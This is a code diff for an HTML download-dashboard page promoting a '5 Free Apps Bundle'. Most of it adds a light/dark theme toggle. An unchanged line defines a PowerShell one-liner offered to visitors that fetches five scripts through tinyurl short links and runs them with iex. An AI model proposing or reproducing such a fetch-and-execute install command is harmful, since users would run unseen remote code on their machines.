@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script>try{var t,m=location.search.match(/[?&]theme=(light|dark)(&|$)/);if(m)t=m[1];if(!t)try{t=localStorage.getItem('theme')}catch(e){}if(!t)try{var d=JSON.parse(window.name);if(d)t=d.theme}catch(e){}if(t==='light')document.documentElement.setAttribute('data-theme','light')}catch(e){}</script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>5 Free Apps Bundle | Download Dashboard</title>
@@ -17,23 +18,77 @@
       padding: 0;
     }
 
-    body {
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-      background: #08080f;
-      min-height: 100vh;
-      padding: 0;
+    :root {
+      --bg-primary: #08080f;
+      --bg-card: linear-gradient(160deg, rgba(26,26,46,0.7), rgba(22,33,62,0.7));
+      --bg-nav: rgba(8,8,15,0.8);
+      --bg-overlay: rgba(8,8,15,0.94);
+      --slider-overlay-bg: rgba(8,8,15,0.88);
+      --bg-slider: linear-gradient(160deg, rgba(26,26,46,0.5), rgba(22,33,62,0.5));
+      --text-primary: #ffffff;
+      --text-secondary: rgba(255,255,255,0.8);
+      --text-tertiary: rgba(255,255,255,0.35);
+      --text-muted: rgba(255,255,255,0.15);
+      --border-color: rgba(255,255,255,0.04);
+      --border-light: rgba(255,255,255,0.06);
+      --grid-color: rgba(255,255,255,0.015);
+      --glow-red: rgba(255,68,68,0.06);
+      --glow-blue: rgba(59,130,246,0.05);
+      --nav-link-color: rgba(255,255,255,0.4);
+      --nav-link-hover-bg: rgba(255,255,255,0.04);
+      --input-bg: rgba(0,0,0,0.3);
     }
 
-    .nav{position:sticky;top:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:14px 24px;background:rgba(8,8,15,0.8);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-bottom:1px solid rgba(255,255,255,0.04);max-width:100%;animation:navSlide 0.6s ease-out}
+    [data-theme="light"] {
+      --bg-primary: #f0f2f5;
+      --bg-card: linear-gradient(160deg, rgba(255,255,255,0.9), rgba(240,242,247,0.9));
+      --bg-nav: rgba(255,255,255,0.85);
+      --bg-overlay: rgba(255,255,255,0.94);
+      --slider-overlay-bg: rgba(255,255,255,0.88);
+      --bg-slider: linear-gradient(160deg, rgba(255,255,255,0.85), rgba(240,242,247,0.85));
+      --text-primary: #1a1a2e;
+      --text-secondary: rgba(26,26,46,0.8);
+      --text-tertiary: rgba(26,26,46,0.5);
+      --text-muted: rgba(26,26,46,0.2);
+      --border-color: rgba(0,0,0,0.06);
+      --border-light: rgba(0,0,0,0.08);
+      --grid-color: rgba(0,0,0,0.04);
+      --glow-red: rgba(255,68,68,0.04);
+      --glow-blue: rgba(59,130,246,0.04);
+      --nav-link-color: rgba(26,26,46,0.5);
+      --nav-link-hover-bg: rgba(0,0,0,0.04);
+      --input-bg: rgba(0,0,0,0.04);
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--bg-primary);
+      color: var(--text-primary);
+      min-height: 100vh;
+      padding: 0;
+      transition: background 0.4s ease, color 0.4s ease;
+    }
+
+    .nav{position:sticky;top:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:14px 24px;background:var(--bg-nav);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-bottom:1px solid var(--border-color);max-width:100%;animation:navSlide 0.6s ease-out}
     @keyframes navSlide{0%{transform:translateY(-100%);opacity:0}100%{transform:translateY(0);opacity:1}}
     .nav-inner{display:flex;align-items:center;gap:32px;max-width:1280px;margin:0 auto;width:100%}
-    .nav-logo{font-size:18px;font-weight:900;color:#fff;text-decoration:none;letter-spacing:-0.5px;display:flex;align-items:center;gap:10px;transition:opacity 0.25s}
+    .nav-logo{font-size:18px;font-weight:900;color:var(--text-primary);text-decoration:none;letter-spacing:-0.5px;display:flex;align-items:center;gap:10px;transition:opacity 0.25s}
     .nav-logo:hover{opacity:0.8}
     .nav-logo-dot{width:10px;height:10px;border-radius:50%;background:linear-gradient(135deg,#ff4444,#ff6b6b);flex-shrink:0}
     .nav-links{display:flex;align-items:center;gap:6px}
-    .nav-link{padding:8px 16px;border-radius:10px;font-size:13px;font-weight:600;color:rgba(255,255,255,0.4);text-decoration:none;transition:all 0.3s ease}
-    .nav-link:hover{color:#fff;background:rgba(255,255,255,0.04)}
+    .nav-link{padding:8px 16px;border-radius:10px;font-size:13px;font-weight:600;color:var(--nav-link-color);text-decoration:none;transition:all 0.3s ease}
+    .nav-link:hover{color:var(--text-primary);background:var(--nav-link-hover-bg)}
     .nav-link.active{color:#ff4444;background:rgba(255,68,68,0.08)}
+    .theme-toggle{width:38px;height:38px;border-radius:12px;border:1px solid var(--border-color);background:var(--nav-link-hover-bg);cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all 0.35s cubic-bezier(0.34,1.56,0.64,1);flex-shrink:0;color:var(--text-tertiary);margin-left:8px;position:relative;overflow:hidden}
+    .theme-toggle:hover{transform:translateY(-2px) scale(1.06);border-color:transparent;color:var(--text-primary);background:var(--nav-link-hover-bg)}
+    .theme-toggle:active{transform:scale(0.92)}
+    .theme-toggle svg{width:18px;height:18px;fill:currentColor;transition:transform 0.5s cubic-bezier(0.34,1.56,0.64,1),opacity 0.3s ease;position:absolute}
+    .theme-toggle .sun{opacity:0;transform:rotate(-90deg) scale(0.5)}
+    [data-theme="light"] .theme-toggle .sun{opacity:1;transform:rotate(0) scale(1)}
+    [data-theme="light"] .theme-toggle .moon{opacity:0;transform:rotate(90deg) scale(0.5)}
+    .theme-toggle::after{content:'';position:absolute;inset:0;border-radius:inherit;background:radial-gradient(circle at center,var(--text-primary) 0%,transparent 70%);opacity:0;transition:opacity 0.4s ease}
+    .theme-toggle:active::after{opacity:0.08}
+    @media(max-width:660px){.theme-toggle{width:34px;height:34px;margin-left:4px}}
     @media(max-width:660px){
       .nav{padding:12px 16px}
       .nav-inner{gap:16px}
@@ -48,8 +103,8 @@
       z-index: 0;
       pointer-events: none;
       background-image:
-        linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
+        linear-gradient(var(--grid-color) 1px, transparent 1px),
+        linear-gradient(90deg, var(--grid-color) 1px, transparent 1px);
       background-size: 48px 48px;
     }
 
@@ -67,7 +122,7 @@
       left: -10%;
       width: 60%;
       height: 60%;
-      background: radial-gradient(circle, rgba(255, 68, 68, 0.06), transparent 60%);
+      background: radial-gradient(circle, var(--glow-red), transparent 60%);
       animation: glowDrift 12s ease-in-out infinite alternate;
     }
 
@@ -78,7 +133,7 @@
       right: -10%;
       width: 60%;
       height: 60%;
-      background: radial-gradient(circle, rgba(59, 130, 246, 0.05), transparent 60%);
+      background: radial-gradient(circle, var(--glow-blue), transparent 60%);
       animation: glowDrift 14s ease-in-out infinite alternate-reverse;
     }
 
@@ -109,7 +164,7 @@
     .hero h1 {
       font-size: 42px;
       font-weight: 900;
-      color: #fff;
+      color: var(--text-primary);
       letter-spacing: -1.5px;
       line-height: 1.15;
     }
@@ -122,7 +177,7 @@
     }
 
     .hero p {
-      color: rgba(255, 255, 255, 0.35);
+      color: var(--text-tertiary);
       font-size: 15px;
       font-weight: 500;
       margin-top: 8px;
@@ -143,7 +198,7 @@
     .hero-grand-label {
       font-size: 14px;
       font-weight: 600;
-      color: rgba(255, 255, 255, 0.5);
+      color: var(--text-tertiary);
       letter-spacing: 0.3px;
       text-transform: uppercase;
     }
@@ -166,11 +221,11 @@
     /* ── Repo Card ── */
     .repo-card {
       flex: 0 1 360px;
-      background: linear-gradient(160deg, rgba(26, 26, 46, 0.7), rgba(22, 33, 62, 0.7));
+      background: var(--bg-card);
       backdrop-filter: blur(12px);
       border-radius: 24px;
       padding: 28px;
-      border: 1px solid rgba(255, 255, 255, 0.04);
+      border: 1px solid var(--border-color);
       box-shadow: 0 8px 40px rgba(0, 0, 0, 0.3);
       transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow 0.4s ease;
       opacity: 0;
@@ -235,7 +290,7 @@
     .repo-owner-name {
       font-size: 11px;
       font-weight: 600;
-      color: rgba(255, 255, 255, 0.3);
+      color: var(--text-tertiary);
       margin-top: 6px;
       letter-spacing: 0.2px;
     }
@@ -278,14 +333,14 @@
     .repo-card-name {
       font-size: 18px;
       font-weight: 800;
-      color: #fff;
+      color: var(--text-primary);
       letter-spacing: -0.3px;
       line-height: 1.2;
     }
 
     .repo-card-desc {
       font-size: 11px;
-      color: rgba(255, 255, 255, 0.3);
+      color: var(--text-tertiary);
       line-height: 1.5;
       margin-top: 4px;
       display: -webkit-box;
@@ -312,7 +367,7 @@
 
     .repo-card-releases {
       font-size: 12px;
-      color: rgba(255, 255, 255, 0.3);
+      color: var(--text-tertiary);
       font-weight: 500;
     }
 
@@ -328,8 +383,8 @@
       align-items: center;
       gap: 10px;
       padding: 10px 14px;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.06);
+      background: var(--nav-link-hover-bg);
+      border: 1px solid var(--border-light);
       border-radius: 12px;
       text-decoration: none;
       color: inherit;
@@ -353,7 +408,7 @@
     }
 
     .exe-btn:hover {
-      background: rgba(255, 255, 255, 0.06);
+      background: var(--nav-link-hover-bg);
       border-color: var(--accent);
       transform: translateX(4px);
     }
@@ -367,8 +422,8 @@
     }
 
     .exe-btn--disabled:hover {
-      background: rgba(255, 255, 255, 0.03);
-      border-color: rgba(255, 255, 255, 0.06);
+      background: var(--nav-link-hover-bg);
+      border-color: var(--border-light);
       transform: none;
     }
 
@@ -410,21 +465,21 @@
       flex: 1;
       font-size: 11px;
       font-weight: 600;
-      color: rgba(255, 255, 255, 0.3);
+      color: var(--text-tertiary);
       transition: color 0.25s ease;
     }
 
-    .exe-toggle:hover .exe-toggle-label {
-      color: rgba(255, 255, 255, 0.55);
+    .exe-toggle-label {
+      color: var(--text-tertiary);
     }
 
     .exe-toggle-badge {
       font-size: 10px;
       font-weight: 700;
-      color: rgba(255, 255, 255, 0.5);
+      color: var(--text-tertiary);
       padding: 2px 10px;
       border-radius: 10px;
-      background: rgba(255, 255, 255, 0.06);
+      background: var(--nav-link-hover-bg);
     }
 
     .exe-older-wrap {
@@ -490,7 +545,7 @@
     .exe-name {
       font-size: 12px;
       font-weight: 600;
-      color: rgba(255, 255, 255, 0.8);
+      color: var(--text-secondary);
       white-space: nowrap;
       overflow: hidden;
       text-overflow: ellipsis;
@@ -499,7 +554,7 @@
     .repo-footer {
       margin-top: 16px;
       padding-top: 14px;
-      border-top: 1px solid rgba(255, 255, 255, 0.05);
+      border-top: 1px solid var(--border-color);
       display: flex;
       align-items: center;
       justify-content: space-between;
@@ -511,18 +566,18 @@
       gap: 6px;
       font-size: 12px;
       font-weight: 600;
-      color: rgba(255, 255, 255, 0.4);
+      color: var(--nav-link-color);
       text-decoration: none;
       padding: 6px 12px;
       border-radius: 8px;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.06);
+      background: var(--nav-link-hover-bg);
+      border: 1px solid var(--border-light);
       transition: all 0.25s ease;
     }
 
     .repo-link:hover {
-      color: #fff;
-      background: rgba(255, 255, 255, 0.08);
+      color: var(--text-primary);
+      background: var(--nav-link-hover-bg);
       border-color: var(--accent);
     }
 
@@ -538,7 +593,7 @@
       gap: 4px;
       font-size: 11px;
       font-weight: 700;
-      color: rgba(255, 255, 255, 0.35);
+      color: var(--text-tertiary);
     }
 
     .star-badge svg {
@@ -558,7 +613,7 @@
       font-weight: 700;
       text-transform: uppercase;
       letter-spacing: 0.5px;
-      color: rgba(255, 255, 255, 0.25);
+      color: var(--text-tertiary);
       margin-bottom: 6px;
       display: flex;
       align-items: center;
@@ -574,8 +629,8 @@
       position: relative;
       overflow: hidden;
       border-radius: 10px;
-      background: rgba(0, 0, 0, 0.3);
-      border: 1px solid rgba(255, 255, 255, 0.06);
+      background: var(--input-bg);
+      border: 1px solid var(--border-light);
       cursor: pointer;
     }
 
@@ -585,7 +640,7 @@
       padding: 10px 12px;
       font-family: 'Consolas', 'Courier New', monospace;
       font-size: 11px;
-      color: rgba(255, 255, 255, 0.55);
+      color: var(--text-tertiary);
       overflow-x: auto;
       white-space: nowrap;
       transition: color 0.3s ease;
@@ -605,8 +660,8 @@
       font-size: 10px;
       font-weight: 600;
       color: var(--accent);
-      background: rgba(255, 255, 255, 0.04);
-      border: 1px solid rgba(255, 255, 255, 0.06);
+      background: var(--nav-link-hover-bg);
+      border: 1px solid var(--border-light);
       border-radius: 6px;
       cursor: pointer;
       opacity: 0;
@@ -626,7 +681,7 @@
       position: absolute;
       inset: 0;
       border-radius: 10px;
-      background: rgba(8, 8, 15, 0.94);
+      background: var(--bg-overlay);
       backdrop-filter: blur(6px);
       display: flex;
       flex-direction: column;
@@ -657,7 +712,7 @@
       font-family: 'Consolas', 'Courier New', monospace;
       font-size: 9px;
       color: var(--accent);
-      background: rgba(255, 255, 255, 0.06);
+      background: var(--nav-link-hover-bg);
       padding: 1px 5px;
       border-radius: 3px;
     }
@@ -665,8 +720,8 @@
     .install-overlay-step kbd {
       font-family: 'Consolas', 'Courier New', monospace;
       font-size: 9px;
-      color: #fff;
-      background: rgba(255, 255, 255, 0.08);
+      color: var(--text-primary);
+      background: var(--nav-link-hover-bg);
       padding: 1px 5px;
       border-radius: 3px;
       border: 1px solid rgba(255, 255, 255, 0.1);
@@ -686,7 +741,7 @@
 
     .exe-size {
       font-size: 10px;
-      color: rgba(255, 255, 255, 0.25);
+      color: var(--text-tertiary);
       font-weight: 500;
     }
 
@@ -731,7 +786,7 @@
     .no-exe {
       padding: 20px;
       text-align: center;
-      color: rgba(255, 255, 255, 0.2);
+      color: var(--text-tertiary);
       font-size: 13px;
       font-weight: 500;
     }
@@ -780,8 +835,8 @@
       position: relative;
       border-radius: 24px;
       overflow: hidden;
-      background: linear-gradient(160deg, rgba(26, 26, 46, 0.5), rgba(22, 33, 62, 0.5));
-      border: 1px solid rgba(255, 255, 255, 0.04);
+      background: var(--bg-slider);
+      border: 1px solid var(--border-color);
       box-shadow: 0 8px 40px rgba(0, 0, 0, 0.3);
     }
 
@@ -909,7 +964,7 @@
       left: 0;
       right: 0;
       padding: 32px 36px;
-      background: linear-gradient(transparent, rgba(8, 8, 15, 0.88) 35%);
+      background: linear-gradient(transparent, var(--slider-overlay-bg) 35%);
       z-index: 3;
       transform: translateY(24px);
       opacity: 0;
@@ -925,7 +980,7 @@
     .slider-label {
       font-size: 24px;
       font-weight: 800;
-      color: #fff;
+      color: var(--text-primary);
       letter-spacing: -0.5px;
       display: flex;
       align-items: center;
@@ -1140,7 +1195,7 @@
     }
 
     .loader-text {
-      color: rgba(255, 255, 255, 0.25);
+      color: var(--text-tertiary);
       font-size: 14px;
       font-weight: 500;
       letter-spacing: 0.3px;
@@ -1171,7 +1226,7 @@
     .error-state {
       text-align: center;
       padding: 40px;
-      color: rgba(255, 255, 255, 0.3);
+      color: var(--text-tertiary);
       font-size: 14px;
     }
 
@@ -1188,9 +1243,9 @@
       font-weight: 700;
       padding: 14px 28px;
       border-radius: 14px;
-      background: linear-gradient(135deg, #1a1a2e, #16213e);
+      background: var(--bg-card);
       border: 1px solid color-mix(in srgb, var(--toast-accent) 30%, transparent);
-      color: #fff;
+      color: var(--text-primary);
       box-shadow: 0 8px 40px color-mix(in srgb, var(--toast-accent) 25%, transparent), 0 0 60px color-mix(in srgb, var(--toast-accent) 8%, transparent);
       opacity: 0;
       transition: none;
@@ -1226,7 +1281,7 @@
     }
 
     #toast .toast-msg {
-      color: rgba(255, 255, 255, 0.9);
+      color: var(--text-secondary);
     }
 
     #toast .toast-app {
@@ -1574,7 +1629,7 @@
       gap: 10px;
       font-size: 13px;
       font-weight: 700;
-      color: rgba(255, 255, 255, 0.35);
+      color: var(--text-tertiary);
       letter-spacing: 0.5px;
       text-transform: uppercase;
       margin-bottom: 14px;
@@ -1589,9 +1644,8 @@
     .bulk-install-box {
       position: relative;
       border-radius: 18px;
-      background: rgba(0, 0, 0, 0.35);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      overflow: hidden;
+      background: var(--input-bg);
+      border: 1px solid var(--border-light);
       transition: border-color 0.4s ease, box-shadow 0.4s ease, transform 0.3s ease;
       cursor: pointer;
       box-shadow:
@@ -1622,8 +1676,7 @@
       font-family: 'Consolas', 'Courier New', monospace;
       font-size: 13px;
       line-height: 1.6;
-      color: rgba(255, 255, 255, 0.6);
-      overflow-x: auto;
+      color: var(--text-tertiary);
       white-space: nowrap;
       transition: color 0.3s ease;
       user-select: all;
@@ -1681,7 +1734,7 @@
       position: absolute;
       inset: 0;
       border-radius: 18px;
-      background: rgba(8, 8, 15, 0.94);
+      background: var(--bg-overlay);
       backdrop-filter: blur(8px);
       -webkit-backdrop-filter: blur(8px);
       display: flex;
@@ -1703,7 +1756,7 @@
 
     .bulk-install-overlay-step {
       font-size: 11px;
-      color: rgba(255, 255, 255, 0.45);
+      color: var(--text-tertiary);
       display: flex;
       align-items: center;
       gap: 6px;
@@ -1712,9 +1765,8 @@
     .bulk-install-overlay-step kbd {
       font-family: 'Consolas', 'Courier New', monospace;
       font-size: 10px;
-      color: #fff;
-      background: rgba(255, 255, 255, 0.08);
-      padding: 2px 6px;
+      color: var(--text-primary);
+      background: var(--nav-link-hover-bg);
       border-radius: 4px;
       border: 1px solid rgba(255, 255, 255, 0.1);
     }
@@ -1817,12 +1869,11 @@
       width: 52px;
       height: 52px;
       border-radius: 16px;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.05);
+      background: var(--nav-link-hover-bg);
+      border: 1px solid var(--border-color);
       transition: all 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
       position: relative;
-      color: rgba(255, 255, 255, 0.3);
-      text-decoration: none;
+      color: var(--text-tertiary);
       overflow: hidden;
     }
 
@@ -1890,10 +1941,8 @@
       transform: translateX(-50%) scale(0.85);
       font-size: 10px;
       font-weight: 700;
-      color: #fff;
+      color: var(--text-primary);
       padding: 4px 12px;
-      border-radius: 8px;
-      background: rgba(8, 8, 15, 0.85);
       backdrop-filter: blur(8px);
       -webkit-backdrop-filter: blur(8px);
       border: 1px solid rgba(255, 255, 255, 0.06);
@@ -1922,7 +1971,7 @@
     .footer-credit {
       margin-top: 20px;
       font-size: 11px;
-      color: rgba(255, 255, 255, 0.15);
+      color: var(--text-muted);
       font-weight: 500;
       letter-spacing: 0.3px;
       transition: color 0.3s ease;
@@ -1959,6 +2008,10 @@
         <a href="blog/index.html" class="nav-link">Guides</a>
         <a href="contact.html" class="nav-link">Contact</a>
       </div>
+      <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+        <svg class="moon" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+        <svg class="sun" viewBox="0 0 24 24"><path d="M12 1v2m0 18v2M4.22 4.22l1.42 1.42m12.72 12.72l1.42 1.42M1 12h2m18 0h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42M12 6a6 6 0 1 0 0 12 6 6 0 0 0 0-12z"/></svg>
+      </button>
     </div>
   </nav>
 
@@ -2253,7 +2306,7 @@
         <div class="hero">
           <h1>5 Free <span>Apps Bundle</span></h1>
           <p>Live download tracker for all projects</p>
-          <p id="lastUpdated" style="font-size:12px;color:rgba(255,255,255,0.2);margin-top:4px"></p>
+          <p id="lastUpdated" style="font-size:12px;color:var(--text-muted);margin-top:4px"></p>
           ${REPOS.length > 1 ? `
           <div class="hero-grand">
             <span class="hero-grand-label">Grand Total</span>
@@ -2279,7 +2332,7 @@
             </a>
           </div>
           <p class="footer-credit" style="margin-bottom:8px">5 Free Apps Bundle &middot; Built with passion</p>
-          <p class="footer-credit" style="font-size:11px"><a href="privacy.html" style="color:rgba(255,255,255,0.2);text-decoration:none;transition:color 0.25s" onmouseover="this.style.color='rgba(255,255,255,0.5)'" onmouseout="this.style.color='rgba(255,255,255,0.2)'">Privacy Policy</a></p>
+          <p class="footer-credit" style="font-size:11px"><a href="privacy.html" style="color:var(--text-muted);text-decoration:none;transition:color 0.25s" onmouseover="this.style.color='var(--text-tertiary)'" onmouseout="this.style.color='var(--text-muted)'">Privacy Policy</a></p>
         </footer>`;
 
       const bulkCmd = '"ytdlps1","mvdlps1","msdlps1","cmmgrps1","sndkkps1" | ForEach-Object { iex (iwr -useb "https://tinyurl.com/$_") }';
@@ -2697,6 +2750,28 @@
     }, { passive: true });
 
     lbStage.addEventListener('touchend', () => { lbTouching = false; }, { passive: true });
+
+    // Theme toggle
+    (function() {
+      function g(){var m=location.search.match(/[?&]theme=(light|dark)(&|$)/);if(m)return m[1];try{var v=localStorage.getItem('theme');if(v)return v}catch(e){}try{var d=JSON.parse(window.name);if(d&&d.theme)return d.theme}catch(e){}return null}
+      function s(v){try{localStorage.setItem('theme',v)}catch(e){}try{var d=JSON.parse(window.name)||{};d.theme=v;window.name=JSON.stringify(d)}catch(e){}}
+      function u(v){try{document.querySelectorAll('a[href]').forEach(function(a){var h=a.getAttribute('href');if(!h||h.startsWith('#')||h.startsWith('http')||h.startsWith('//')||h.startsWith('mailto'))return;var b=h.split('?')[0],p=(h.split('?')[1]||'').split('&').filter(function(x){return!x.startsWith('theme=')}).join('&');        if(v==='light'){p=p?p+'&theme=light':'theme=light';a.href=b+'?'+p}else{a.href=p?b+'?'+p:b}})}catch(e){}}
+      try {
+        const toggle = document.getElementById('themeToggle');
+        if (!toggle) return;
+        const stored = g();
+        if (stored === 'light') document.documentElement.setAttribute('data-theme', 'light');
+        u(stored||'dark');
+        toggle.addEventListener('click', () => {
+          const isLight = document.documentElement.getAttribute('data-theme') === 'light';
+          const next = isLight ? 'dark' : 'light';
+          document.documentElement.setAttribute('data-theme', next);
+          s(next);
+          u(next);
+          try{var u2=new URL(window.location);if(next==='light')u2.searchParams.set('theme','light');else u2.searchParams.delete('theme');history.replaceState(null,'',u2.pathname+u2.search)}catch(e){}
+        });
+      } catch(e) {}
+    })();
 
     loadAll().then(updateTimestamp, updateTimestamp);
     setInterval(() => loadAll().then(updateTimestamp, updateTimestamp), 600000);
